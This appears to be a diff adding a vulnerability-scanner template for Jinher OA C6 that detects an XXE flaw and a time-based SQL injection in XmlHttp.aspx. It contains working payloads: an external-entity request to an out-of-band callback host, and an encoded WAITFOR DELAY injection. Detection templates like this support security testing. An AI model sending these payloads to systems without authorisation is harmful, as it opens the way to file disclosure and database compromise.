@@ -1,0 +1,60 @@
+id: jinher-oa-c6-dailytaskmanage-XmlHttp-xxe-sqli
+info:
+  name: 金和OA dailytaskmanage/XmlHttp.aspx XXE漏洞+SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 Jhsoft.Web.dailytaskmanage/XmlHttp.aspx 接口处存在XXE漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/rog9ihrbis4libh3
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,xxe,jinher,oob
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /c6/Jhsoft.Web.dailytaskmanage/XmlHttp.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Content-Length: 130
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [
+        <!ENTITY % remote SYSTEM "http://{{interactsh-url}}">
+        %remote;]>
+        <root/>
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: xxe
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /c6/Jhsoft.Web.dailytaskmanage/XmlHttp.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Content-Length: 202
+
+        <root><Flag>CheckTask</Flag><TaskID>&#x2d;&#x31;&#x27;&#x57;&#x41;&#x49;&#x54;&#x46;&#x4f;&#x52;&#x2f;&#x2a;&#x2a;&#x2f;&#x44;&#x45;&#x4c;&#x41;&#x59;&#x27;&#x30;&#x3a;&#x30;&#x3a;&#x35;</TaskID></root>
+
+    matchers:
+      - type: dsl
+        name: sqli
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
